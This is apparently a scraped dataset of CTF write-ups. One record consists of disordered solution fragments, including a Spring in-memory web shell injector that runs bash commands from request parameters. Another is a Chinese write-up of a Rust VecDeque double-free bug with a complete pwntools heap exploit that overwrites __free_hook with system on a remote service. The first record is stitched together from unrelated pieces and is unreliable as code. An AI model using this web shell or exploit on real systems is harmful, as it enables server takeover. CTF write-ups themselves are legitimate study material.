line[line.find(\"==\")+2:].strip()\n    print(line)\n    while True:\n        s = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(4))\n        h1 = sha256((s+part).encode()).hexdigest()\n        if h1 == h:\n            r.recvuntil(\"Give\")\n            r.sendline(s)\n            break\n\n\ndef collect_cov(ast):\n    cov = 0\n    if isinstance(ast, lark.tree.Tree):\n        for ch in ast.children:\n            cov |= collect_cov(ch)\n        if ast.data.startswith('cov_'):\n            num = int(ast.data[4:])\n            cov |= (1<<num)\n    return cov\n\n\ndef solve(local):\n    if local:\n        r = remote(\"localhost\", 10002)\n    else:\n        r = remote(\"121.5.253.92\", 10001)\n        proof(r)\n\n    r.recvuntil(\"today:\")\n    gram0 = r.recvuntil(\"EOF\", drop=True)\n    gram0 = gram0.decode()\n    with open(\"input\", \"w\") as f:\n        f.write(gram0)\n    parser0 = lark.Lark(gram0)    \n\n    gram = parse_gram(gram0)\n    expr_rules, stmt_rules = parse_rules(gram)\n\n    codes = set()\n    solver = Solver(expr_rules, stmt_rules)\n    N = 0x1000\n    while len(codes) < N:\n        sol = solver.run()\n        ast = parser0.parse(sol)\n        cov = collect_cov(ast)\n        if bin(cov).count(\"1\") >= 20:\n            codes.add(sol)\n        print(\"len\", len(codes))\n    assert solver.all_cover()\n\n    MAXSIZE = 0x200000\n    code = \"|\".join(list(codes))\n    code = zlib.compress(code.encode())\n    size = len(code)\n    assert size < MAXSIZE\n    code = code.hex()\n\n    #context.log_level = \"debug\"\n    r.recvuntil(\"size\")\n    r.sendline(str(size))\n    r.recvuntil(\"code(hex): \")\n    r.sendline(code)\n    flag = r.recvall().decode()\n    r.close()\n    return flag\n\n\nif __name__ == \"__main__\":\n    while True:\n        flag = solve(local=True)\n        if \"fail\" not in flag:\n            print(flag)\n            break\n\n    part1 = line.split('===')[0]\n    print(line)\n    part2 = line.split('===')[1]\n\n\n    def to_int(x):\n        if x == '_':\n            return None\n        else:\n            return int(x)\n\n\n    print(orig_line)\n\n\n    f.write('digraph {')\n    printed = []\n    for g in graph:\n        num, op, ins, out = g\n        f.write('{} [label=\"{} {}\"]\\n'.format(num, num, op))\n        printed.append(num)\n\n\n    out_printed = []\n\n\n    for g in graph:\n        num, op, ins, out = g\n        for o in out:\n            if o:\n                f.write('{} -> {};\\n'.format(num, o))\n                out_printed.append((num, o))\n\n\n        for i in ins:\n            if i:\n                if not i in printed:\n                    f.write('{} [label=\"{} {}\"]\\n'.format(i, i, table[str(i)]))\n                if not (i, num) in out_printed:\n                    f.write('{} -> {};\\n'.format(i, num))\n                    out_printed.append((i, num))\n\n\n        for (int i = 0; i < 15; ++i) {\n            System.out.print((char)a[i]);\n        }\n\n\n    io.recvuntil(\"<3\\n\")\n    rr=str(io.readline().strip(),encoding = \"utf8\")\n    print(\"fuck:\",rr)\n    for i in itertools.permutations(string.printable,4):\n        #print(hashlib.sha256(\"\".join(i).encode()).hexdigest()[-6:],rr)\n        if hashlib.sha256(\"\".join(i).encode()).hexdigest()[-6:] == rr:\n            result=\"\".join(i)\n            print(\"pass_pow:\"+result)\n            io.writeline(result)\n            break\n    else:\n        print('error')\n\n\n    d=\"🍐🍳🎶🏁🏠🐣🐶👃👈👉💀💺📄🔥🦅🪓\"\n    result=0\n    for i in emojistr:\n        #print(i,d.index(i))\n        result=(result<<4)+d.index(i)\n    return result\n\n\n    io.recvuntil(\"> \")\n    io.writeline(\"2\")\n    io.recvuntil(\"❔:\")\n    io.writeline(convert_number_to_emoji(v40))\n    checkstr=str(io.readline().strip(),encoding=\"utf8\")\n    check_c=convert_emoji_to_number(checkstr)\n    #print(v40,convert_number_to_emoji(v40))\n    #print(check_c)\n    #print(gmpy2.jacobi(check_c,n))\n    return gmpy2.jacobi(check_c,n)\n\n\n    newp=up-((up-down)//2)\n    print(newp)\n    if put_up(newp)==1:\n        up=newp\n    else:\n        down=newp\n\n\n        String hex = Utils.bytesTohexString(bytes);\n        System.out.println(hex);\n\n\n        javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) servletRequestAttributes).getRequest();\n        org.springframework.web.context.WebApplicationContext context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(req.getServletContext());\n        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(\"requestMappingHandlerMapping\");\n        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n        field.setAccessible(true);\n        java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping);\n        java.lang.String className = \"com.example.memshell_spring_boot.evil.EvilInterceptor\";\n        java.lang.String b64 = \"yv66vgAAADQAeQoAGgA8CAAyCwA9AD4IAD8KAEAAQQcAQggAQwgARAoAQABFCgBGAEcKAEYASAoARgBJBwBKCgANADwKAA0ASwgATAoADQBNCgBOAE8KAE4AUAoABgBRCgANAFIIAFMLAFQAVQoAVgBXBwBYBwBZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADdMY29tL2V4YW1wbGUvbWVtc2hlbGxfc3ByaW5nX2Jvb3QvZXZpbC9FdmlsSW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3Rkb3V0AQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAGc3RkZXJyAQAKc3Rkb3V0QnVmZgEAAltCAQAKc3RkZXJyQnVmZgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVzAQANU3RhY2tNYXBUYWJsZQcAQgEACkV4Y2VwdGlvbnMHAFoBABBNZXRob2RQYXJhbWV0ZXJzAQAKU291cmNlRmlsZQEAFEV2aWxJbnRlcmNlcHRvci5qYXZhDAAbABwHAFsMAFwAXQEAAAcAXgwAXwBgAQAQamF2YS9sYW5nL1N0cmluZwEACS9iaW4vYmFzaAEAAi1jDABhAGIHAGMMAGQAZQwAZgBnDABoAGcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAaQBqAQAjLS0tLS0tLS0tLS0tLXN0ZG91dC0tLS0tLS0tLS0tLS0tLQoMAGsAbAcAbQwAbgBlDABvAHAMABsAcQwAaQByAQAjLS0tLS0tLS0tLS0tLXN0ZGVyci0tLS0tLS0tLS0tLS0tLQoHAHMMAHQAdQcAdgwAdwB4AQA1Y29tL2V4YW1wbGUvbWVtc2hlbGxfc3ByaW5nX2Jvb3QvZXZpbC9FdmlsSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAHd2FpdEZvcgEAAygpSQEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA5nZXRFcnJvclN0cmVhbQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQAEcmVhZAEABShbQilJAQAFKFtCKVYBABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhABkAGgAAAAAAAgABABsAHAABAB0AAAAvAAEAAQAAAAUqtwABsQAAAAIAHgAAAAYAAQAAAAkAHwAAAAwAAQAAAAUAIAAhAAAAAQAiACMAAwAdAAAB6gAFAAsAAAEDKxICuQADAgA6BBIEOgUZBMYA8bgABQa9AAZZAxIHU1kEEghTWQUZBFO2AAk6BhkGtgAKVxkGtgALOgcZBrYADDoIuwANWbcADhkFtgAPEhC2AA+2ABE6BRkHtgASvAg6CRkHGQm2ABNXuwANWbcADhkFtgAPuwAGWRkJtwAUtgAPtgAROgW7AA1ZtwAOGQW2AA8QCrYAFbYAEToFuwANWbcADhkFtgAPEha2AA+2ABE6BRkItgASvAg6ChkIGQq2ABNXuwANWbcADhkFtgAPuwAGWRkKtwAUtgAPtgAROgW7AA1ZtwAOGQW2AA8QCrYAFbYAEToFLLkAFwEAGQW2ABgErAAAAAMAHgAAAE4AEwAAAAsACgAMAA4ADQATAA4ALgAPADQAEAA7ABEAQgASAFgAEwBhABQAaQAVAIYAFgCcABcAsgAYALsAGQDDABoA4AAbAPYAHAEBAB4AHwAAAHAACwAuANMAJAAlAAYAOwDGACYAJwAHAEIAvwAoACcACABhAKAAKQAqAAkAuwBGACsAKgAKAAABAwAgACEAAAAAAQMALAAtAAEAAAEDAC4ALwACAAABAwAwADEAAwAKAPkAMgAzAAQADgD1ADQAMwAFADUAAAALAAH9AQEHADYHADYANwAAAAQAAQA4ADkAAAANAwAsAAAALgAAADAAAAABADoAAAACADs=\";\n        sun.misc.BASE64Decoder mydecoder = (sun.misc.BASE64Decoder)sun.misc.BASE64Decoder.class.newInstance();\n        byte[] bytes = mydecoder.decodeBuffer(b64);\n        java.lang.ClassLoader classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n        java.lang.System.out.println(\"flight\");\n        java.lang.System.out.println(classLoader);\n        java.lang.System.out.println(className);\n        java.lang.System.out.println(bytes);\n        java.lang.System.out.println(bytes.length);\n        java.lang.reflect.Field field = Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n        field.setAccessible(true);\n        sun.misc.Unsafe unsafe = field.get(null);\n        java.lang.Class cls = unsafe.defineClass(\"com.example.memshell_spring_boot.evil.EvilInterceptor\", bytes, 0, bytes.length, classLoader, java.lang.System.class.getProtectionDomain());\n        java.lang.System.out.println(\"flight2\");\n        java.lang.System.out.println(cls);\n        adaptedInterceptors.add(cls.newInstance());\n\n\n    for (int i = 0; i < 16; ++i)\n        printf(\"%02d \", buf[i]);\n    putchar('\\n');\n\n\n    for (int i = 0; i < 4; ++i) {\n        for (int j = 0; j < 4; ++j)\n            printf(\"%02d \", buf[i][j]);\n        putchar('\\n');\n    }\n\n\n    for (int i = 0; i < 1337; ++i) {\n        printf(\"round %d\\n\", i);\n        hash_inv(buf);\n        print(buf);\n    }\n\n\n    if -1 not in aa.column(col)[row:]: #选择已经求出A的列\n        print(col)  #每一行赋值，用来构成解方程的矩阵\n        X[cnt] = (A+R).column(col)[row:]\n        Y[cnt] = E[row][col]\n        cnt += 1\n        if cnt==11-row:\n            #print(X)\n            #print(Y)\n            r = X.solve_right(Y) # 求出U对应位置的值\n            print(r)\n            # 将结果写入到U中\n            for tmp_idx in range(cnt):\n                U[row, row+tmp_idx] = r[tmp_idx, 0]\n            print(U)\n            break\n\n\n    for i2 in alphabet:\n        for i3 in alphabet:\n            for i4 in alphabet:\n                for i5 in alphabet:\n                    flag = i1+i2+i3+i4+i5+\"=bS2dAf3bohLgYo!BcN\"\n                    #print(len(flag))\n                    if sha256(flag.encode()).hexdigest() == \"95cb911a467482cc0f879861532e9ec7680b0846b48a9de25fb13b01c583d9f8\":\n                        print(i1+i2+i3+i4+i5)\n                        exit(0)\n\n\n    encoding = face_recognition.face_encodings(im)[0]\n    #print(\"emb\", encoding)\n    dis = face_recognition.face_distance([keyface_encoding], encoding)\n    return dis[0]\n\n\n    global model\n    im_faces = tf.cast(im_faces, tf.float32)\n    with tf.GradientTape() as tape:\n        tape.watch(im_faces)\n        pred = model(im_faces)\n        #print(\"tensorflow\", pred)\n        loss = tf.norm(pred - keyface_encoding, axis=1, ord=2)\n    grad = tape.gradient(loss, im_faces)\n    return loss, grad\n\n\n    jitter_num = 1000\n    imgs = dlib.jitter_image(im, jitter_num)\n    imgs = np.array([normalize_image(img) for img in imgs])\n    loss, grad = model_predict(imgs)\n    print(tf.reduce_mean(loss))\n\n\n    loss2 = check(im)\n    print(loss2)\n    if loss2 < 0.25:\n        break\n    face = face_recognition.face_locations(im)[0]\n    im = edit_image(im, face)\n    Image.fromarray(im).save(\"hack.png\")\n\n\n    def __init__(self, typ, data = None):\n        if typ == PartType.STRING and not isinstance(data, str):\n            raise ValueError\n        self.typ = typ\n        self.data = data\n\n\n    def __repr__(self) -> str:\n        s = str(self.typ)\n        if self.data is not None:\n            s += \" \\\"%s\\\"\" % self.data\n        return s\n\n\n    def complexity(self):\n        if self.typ == PartType.EXPRESSION:\n            c = 13.5\n        elif self.typ == PartType.STATEMENT:\n            c = 42.73\n        elif self.typ == PartType.STRING:\n            c = len(self.data)\n        else:\n            c = 1\n        return float(c)\n\n\n    def expandable(self):\n        return self.typ == PartType.STATEMENT or self.typ == PartType.EXPRESSION\n\n\n    def __init__(self, parts: List[Part], cov: int):\n        self.parts = parts\n        self.cov = cov\n\n\n    def __repr__(self) -> str:\n        return \" \".join(str(x) for x in self.parts) + \" -> cov_%d\" % self.cov\n\n\n    def complexity(self):\n        return sum([p.complexity() for p in self.parts])\n\n\n    def expandable(self):\n        return any(p.expandable() for p in self.parts)\n\n\n    def __init__(self, expr_rules: List[Rule], stmt_rules: List[Rule]):\n        self.expr_rules = expr_rules\n        self.stmt_rules = stmt_rules\n        self.expr_cov = [False] * len(self.expr_rules)\n        self.stmt_cov = [False] * len(self.stmt_rules)\n        self.count = 0\n\n\n    def all_cover(self):\n        return all(self.expr_cov) and all(self.stmt_cov)\n\n\n    def run(self):\n        stmt_id = self.get_stmt_id(True)\n        sol, anum = self.generate(self.stmt_rules[stmt_id], MIN_COV)\n        #print(sol)\n        return sol\n\n\n    def get_rule_id(rules, cov, expand):\n        rid = None\n        n = len(rules)\n        for i in range(n):\n            if expand and not rules[i].expandable():\n                continue\n            if not cov[i]:\n                rid = i\n                break\n        if rid is None:\n            if expand:\n                rid = random.choice([i for i in range(n) if rules[i].expandable()])\n            else:\n                rid = random.choice(range(n))\n        cov[rid] = True\n        return rid\n\n\n    def get_stmt_id(self, expand):\n        return Solver.get_rule_id(self.stmt_rules, self.stmt_cov, expand)\n\n\n    def get_expr_id(self, expand):\n        return Solver.get_rule_id(self.expr_rules, self.expr_cov, expand)\n\n\n    def generate(self, rule: Rule, cnum: int):\n        code = \"\"\n        anum = 1\n        #print(\"gen\", cnum, rule)\n        for part in rule.parts:\n            if part.typ == PartType.DIGIT or part.typ == PartType.NUMBER:\n                s = random.choice(string.digits)\n            elif part.typ == PartType.LETTER or part.typ == PartType.WORD:\n                s = random.choice(string.ascii_letters)\n            elif part.typ == PartType.STRING:\n                s = part.data\n            elif part.typ == PartType.EXPRESSION:\n                expr_id = self.get_expr_id(anum + 1 < cnum)\n                s, _anum = self.generate(self.expr_rules[expr_id], cnum - anum)\n                anum += _anum\n            elif part.typ == PartType.STATEMENT:\n                stmt_id = self.get_stmt_id(anum + 1 < cnum)\n                s, _anum = self.generate(self.stmt_rules[stmt_id], cnum - anum)\n                anum += _anum\n            else:\n                raise ValueError\n            #print(s, part)\n            code += s + \" \"\n        #print(anum, cnum)\n        #print(\"rule\", rule)\n        assert anum >= cnum\n        return code, anum\n\n\n    line = r.recvline().decode().strip()\n    part = line[line.find(\"+\")+1:line.find(\")\")]\n    h = line[line.find(\"==\")+2:].strip()\n    print(line)\n    while True:\n        s = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(4))\n        h1 = sha256((s+part).encode()).hexdigest()\n        if h1 == h:\n            r.recvuntil(\"Give\")\n            r.sendline(s)\n            break\n\n\n    codes = set()\n    solver = Solver(expr_rules, stmt_rules)\n    N = 0x1000\n    while len(codes) < N:\n        sol = solver.run()\n        ast = parser0.parse(sol)\n        cov = collect_cov(ast)\n        if bin(cov).count(\"1\") >= 20:\n            codes.add(sol)\n        print(\"len\", len(codes))\n    assert solver.all_cover()\n\n\n    while True:\n        flag = solve(local=True)\n        if \"fail\" not in flag:\n            print(flag)\n            break\n", "tools": ["python", "gmpy2", "gdb"], "file_path": "temp_repos\\r3kapig_writeup\\20211011-0ctf-finals\\README.md", "file_size": 62588, "scraped_at": "2025-10-26T18:19:26.668903"}
{"id": "r3kapig_writeup_Hack.lu_CTF_2021_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "Hack.lu CTF 2021 Writeup", "attack_type": "Hash", "writeup": "# Hack.lu CTF 2021 Writeup\n\n## 前言\n\n本次比赛我们获得了第五名的成绩\n\n![](https://i.imgur.com/HDBtpK4.png)\n\n现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：root@r3kapig.com\n\n## Pwn\n\n### UnsAFe(Mid)\n\n可能写得有些啰嗦 但是算是完整记录了这个题目 师傅们凑合看看\n\n#### 简述\n\n这道题的考察点就是 [Rust CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36318) + 堆风水操控。其中 Rust 标准库中 `VecDeque` 的漏洞比较有意思，下面也会重点讲该漏洞的成因和利用方法\n\n#### 功能\n\n程序开头先初始化了几个变量，这些变量接下来也会用到。\n\n下面是它们的类型（有调试信息可以直接找到）：\n\n```rust\nself.pws: HashMap<String, String, RandomState> \nhighlighted_tast.q: Box<Vec<String>>;\ntask_queue.q:VecDeque<BoxVec<alloc::string::String>>>\n```\n\n分析结果:\n\n0 功能是向 `PasswordManager` 的 hashmap 中添加一个 key-value\n\n1 功能是通过输入 key，来在 hashmap 中查找 value\n\n2 功能是修改键值对，但是如果 insert 时的 str 长度 > 需要替换的 str，则会插入，否则会替换\n\n3 输入 task 数量，然后对每个 task 要输入 elem （String）数量，对每个 String 要输入长度和内容，最后 `push_back` 到 `TaskDeque` 中\n\n4 功能是用 `pop_front` 从 3 中 `TaskQueue` 取一个 `Vec<String> q`，然后 `highlighted_task->q = q`\n\n5 功能是修改 `highlighted_task` 中的 vec，给定需要修改的 idx 和新内容进行修改 ，会存在和 2 功能一样的问题\n\n6 功能是通过输入 idx 获取 highlighted_task 中的 value\n\n7 功能是向 highlighted_task 添加（push）一个 value\n\n#### 漏洞：\n\n找到了一个漏洞：[VecDeque: length 0 underflow and bogus values from pop_front(), triggered by a certain sequence of reserve(), push_back(), make_contiguous(), pop_front()](https://github.com/rust-lang/rust/issues/79808)，存在于 1.48.0 版本的 `VecDeque<T>::make_contiguous` 函数中。\n\n查找字符串可以找到编译器的版本:\n\n![](https://i.imgur.com/XZ2Hzgw.png)\n\n在 `unsafe::TaskQueue::push_back::haa04777951b4543a` 函数中也调用了 `make_contiguous`\n\n![](https://i.imgur.com/hVAK2Ro.png)\n\n对上了！下面就来研究一下这个漏洞。\n\n安装 rust 1.48 及其源码：\n\n```bash\n$ rustup install 1.48\n$ rustup +1.48 component add rust-src\n```\n\n找到对应 patch：[fix soundness issue in `make_contiguous` #79814](https://github.com/rust-lang/rust/pull/79814/files)\n\n#### VecDeque 的内部表示\n\n结构体：\n\n- .rustup/toolchains/1.48-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/alloc/src/collections/vec_deque.rs\n\n```rust\n    pub struct VecDeque<T> {\n    \t// tail and head are pointers into the buffer. Tail always points\n    \t// to the first element that could be read, Head always points\n    \t// to where data should be written.\n    \t// If tail == head the buffer is empty. The length of the ringbuffer\n    \t// is defined as the distance between the two.\n    \ttail: usize,\n    \thead: usize,\n    \tbuf: RawVec<T>,\n    }\n```\n这里借用 **[Analysis of CVE-2018-1000657: OOB write in Rust's VecDeque::reserve()](https://gts3.org/2019/cve-2018-1000657.html)** 中的图示：\n\n![](https://gts3.org/blog/cve-2018-1000657.assets/ring-buffer.png)\n\n\npoc:\n\nhttps://github.com/rust-lang/rust/issues/79808#issuecomment-740188680\n\n修改 `VecDeque<int>` 为 `VecDeque<String>`：\n\n- poc.rs\n\n```rust\n  use std::collections::VecDeque;\n  \n  fn ab(dq: &mut VecDeque<String>, sz: usize) {\n      for i in 0..sz {\n          let string = (i).to_string();\n          dq.push_back(string);\n      }\n      dq.make_contiguous();\n      for _ in 0..sz {\n          dq.pop_front();\n      }\n  }\n  \n  fn ab_1(dq: &mut VecDeque<String>, sz: usize) {\n      for i in 0..sz {\n          let string = (i).to_string();\n          dq.push_back(string);\n      }\n      for _ in 0..sz {\n          dq.pop_front();\n      }\n  }\n  \n  // let free = self.tail - self.head;\n  // let tail_len = cap - self.tail;\n  \n  fn main() {\n      let mut dq = VecDeque::new(); // 默认capacity为7\n      ab_1(&mut dq, 2);\n      ab(&mut dq, 7);\n      \n      dbg!(dq.len()); // this is zero\n      \n      dbg!(dq.pop_front()); // uaf+double frees\n  }\n```\n\n编译并运行：\n\n```bash\n$ rustc poc.rs\n$ ./poc \n[poc.rs:32] dq.len() = 0\n[poc.rs:34] dq.pop_front() = Some(\n    \"@\",\n)\nfree(): double free detected in tcache 2\nAborted\n```\n\n发生了 double free\n\npatch:\n\nhttps://github.com/rust-lang/rust/issues/80293\n\n漏洞的成因：\n\n![](https://i.imgur.com/OBQ7DUU.png)\n\n![](https://i.imgur.com/0EoJVuM.png)\n\n#### VecDeque\\<T>::make_contiguous\n\n`make_contiguous` 的作用是使 `VecDeque` 的元素变得连续，这样就可以调用 `as_slice` 等方法获得 `VecDeque` 的切片。\n\n接下来结合源码、POC 和 Patch 画图分析： \n\n首先创建 capacity 为 3 的 VecDeque：`let mut dq = VecDeque::with_capacity(3);`\n\n![](https://i.imgur.com/RkvBud1.png)\n\n然后 `dq.push_back(val);` 两次，`dq.pop_front();` 两次：\n\n![](https://i.imgur.com/nrLSqs5.png)\n\n然后再依次 `push_back` a、b、c：\n\n![](https://i.imgur.com/oY4eaco.jpg)\n\n此时调用 `dq.make_contiguous();`：\n\n此时 `self.tail == 2, self.head == 1, free == 1, tail_len == , len == 3`\n\n执行流程会走入 `else if free >= self.head`\n\n- `make_contiguous`\n\n```rust\n  #[stable(feature = \"deque_make_contiguous\", since = \"1.48.0\")]\n      pub fn make_contiguous(&mut self) -> &mut [T] {\n          if self.is_contiguous() {\n              let tail = self.tail;\n              let head = self.head;\n              return unsafe { &mut self.buffer_as_mut_slice()[tail..head] };\n          }\n  \n          let buf = self.buf.ptr();\n          let cap = self.cap();\n          let len = self.len();\n  \n          let free = self.tail - self.head;\n          let tail_len = cap - self.tail;\n  \n          if free >= tail_len {\n              // there is enough free space to copy the tail in one go,\n              // ", "solution_code": "from pwn import *\n\nlibc = ELF(\"./libc-2.33.so\")\n\nclass PasswordManager(object):\n        def insert(self, name, context):\n                io.send(p8(0))\n\n                size1 = len(name)\n                io.send(p8(size1))\n                for i in range(size1):\n                        ascii = ord(name[i])\n                        io.send(p8(ascii))\n\n                size2 = len(context)\n                io.send(p8(size2))\n                for i in range(size2):\n                        ascii = ord(context[i])\n                        io.send(p8(ascii))\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n        def get(self, name):\n                io.send(p8(1))\n\n                size = len(name)\n                io.send(p8(size))\n\n                for i in range(size):\n                        ascii = ord(name[i])\n                        io.send(p8(ascii))\n                password = io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\", drop=True)\n                print(b\"password = \" + password)\n                return password\n\n        def alter(self, name, new_context):\n                io.send(p8(2))\n                size = len(name)\n                io.send(p8(size))\n                for i in range(size):\n                        ascii = ord(name[i])\n                        io.send(p8(ascii))\n                size2 = len(new_context)\n                io.send(p8(size2))\n                for i in range(size2):\n                        ascii = ord(new_context[i])\n                        io.send(p8(ascii))\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n        def alter_bytes(self, name, new_context):\n                io.send(p8(2))\n                size = len(name)\n                io.send(p8(size))\n                for i in range(size):\n                        ascii = ord(name[i])\n                        io.send(p8(ascii))\n\n                size2 = len(new_context)\n                io.send(p8(size2))\n                io.send(new_context)\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\nclass HighlightedTask(object):\n        def add(self, context):\n            io.send(p8(7))\n\n            size = len(context)\n            io.send(p8(size))\n\n            for i in range(size):\n                ascii = ord(context[i])\n                io.send(p8(ascii))\n            io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n        def show(self, idx):\n                io.send(p8(6))\n\n                io.send(p8(idx))\n\n                content = io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\", drop=True)\n                print(b\"content = \" + content)\n                return content\n\n        def alter(self, idx, new_context):\n                io.send(p8(5))\n                io.send(p8(idx))\n                size = len(new_context)\n                io.send(p8(size))\n                for i in range(size):\n                        ascii = ord(new_context[i])\n                        io.send(p8(ascii))\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n        def alter_bytes(self, idx, new_context):\n                io.send(p8(5))\n                io.send(p8(idx))\n                size = len(new_context)\n                io.send(p8(size))\n                io.send(new_context)\n\n        def pop_set(self):\n                io.send(p8(4))\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n        def push_back(self, task_list):\n                io.send(p8(3))\n\n                task_num = len(task_list)\n                io.send(p8(task_num))\n\n                for t in range(task_num):\n                        self.one_task(task_list[t])\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n        def one_task(self, context_list):\n            vec_num = len(context_list)\n\n            io.send(p8(vec_num))\n\n            for i in range(vec_num):\n                size = len(context_list[i])\n                io.send(p8(size))\n\n                for j in range(size):\n                    ascii = ord(context_list[i][j])\n                    io.send(p8(ascii))\n\n#io = process(\"./unsafe\")\nio = remote(\"flu.xxx\", 20025)\n\nht = HighlightedTask()\ntask_list = []\ncontext_list1 = ['y' * 0x28, 'z' * 0x28]\nfor i in range(2):\n    task_list.append(context_list1)\nht.push_back(task_list)\nfor i in range(2):\n    ht.pop_set()\nfor i in range(4):\n    task_list.append(context_list1)\ncontext_list1 = ['j' * 0x58, 'k' * 0x58]\ntask_list.append(context_list1)\nht.push_back(task_list)\nfor i in range(6):\n    ht.pop_set()\nht.pop_set()\n\npm = PasswordManager()\ncontext_list2 = ['s' * 0x28, 't' * 0x28]\ntask_list = []\nfor i in range(7):\n    task_list.append(context_list2)\nht.push_back(task_list) # 把tcache free list 中的chunk全部申请完\n\nht.pop_set() # 返回和上一次pop相同的highlighted_task\npm.insert('1' * 8, 'j' * 8)\npm.alter('1' * 8, '\\x00' * 0x11) # 这个value将被free，然后就可以泄漏堆地址了\nht.pop_set()\nheap_addr = u64(pm.get('1' * 8)[8:16].ljust(8, b'\\x00')) - 0x10\nprint(\"heap_addr = \" + hex(heap_addr))\n\nfor i in range(10):\n    ht.pop_set()\n\n# 第二次利用VecDeque::make_contiguous中的漏洞\ntask_list = []\ncontext_list1 = ['g' * 0x28, 'h' * 0x28]\nfor i in range(2):\n    task_list.append(context_list1)\nprint(task_list)\nht.push_back(task_list)\nfor i in range(2):\n    ht.pop_set()\nfor i in range(4):\n    task_list.append(context_list1)\ncontext_list1 = ['n' * 0x58, 'o' * 0x58]\ntask_list.append(context_list1)\nht.push_back(task_list)\nfor i in range(6):\n    ht.pop_set()\nht.pop_set()\n\ncontext_list2 = ['a' * 0x28, 'i' * 0x28]\ntask_list = []\nfor i in range(20):\n    task_list.append(context_list2)\nht.push_back(task_list) # 把tcache free list 中的chunk全部申请完\n\nht.pop_set()\npm.insert('2' * 1, 'j' * 2)\n#0x5070 0x5bc0 0x5ac0\npm.alter_bytes('2' * 1, (p64(heap_addr + 0x59b0) + p64(0x2000) + p64(0x2000)).ljust(0x18, b'v'))\npm.insert('3' * 1, 'j' * 0xff)\nfor i in range(8):\n    pm.alter_bytes('3' * 1,  (p64(heap_addr + 0x5070) + p64(0x18) + p64(0x18)).ljust(0xfe, b'v'))\nlibc.address = u64(ht.show(0)[16:]) - 0x1e0c00\nprint(\"libc.address = \" + hex(libc.address))\n\npm.alter_bytes('3' * 1,  (p64(0xdeadbeef) * 2 + p64(libc.symbols[\"__free_hook\"] - 0x8) + p64(0x30) + p64(0x50)).ljust(0xfe, b'v'))\nht.alter_bytes(0xc, b\"/bin/sh\\x00\" + p64(libc.symbols[\"system\"]))\n\nio.interactive()\n\nfrom pwn import *\nimport 